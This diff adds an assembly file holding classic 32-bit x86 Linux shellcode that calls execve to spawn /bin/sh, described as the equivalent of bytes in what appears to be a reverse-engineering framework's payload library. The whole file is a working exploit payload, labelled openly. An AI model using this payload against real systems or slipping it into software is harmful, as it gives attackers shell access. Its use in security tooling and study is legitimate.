@@ -1,0 +1,15 @@
+; x86 (32-bit) execve /bin/sh shellcode
+; Assembly equivalent of the bytes originally stored in
+; libr/egg/p/sc/src/x86-linux-binsh.c
+
+xor eax, eax
+push eax
+push 0x68732f2f     ; "//sh"
+push 0x6e69622f     ; "/bin"
+mov ebx, esp
+push eax
+push ebx
+mov ecx, esp
+cdq
+mov al, 0xb         ; execve syscall number
+int 0x80
